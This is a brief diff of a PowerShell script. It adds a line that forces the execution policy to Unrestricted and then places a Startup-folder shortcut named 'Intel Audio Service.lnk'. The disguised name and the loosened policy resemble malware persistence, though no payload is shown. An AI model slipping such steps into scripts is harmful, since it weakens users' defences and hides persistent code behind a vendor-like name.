@@ -9,6 +9,7 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
      }
      
      # Remainder of script here
+     Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
       $WScriptShell = New-Object -ComObject WScript.Shell
       $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
       $ShortcutFile = "$FolderPath\Intel Audio Service.lnk"
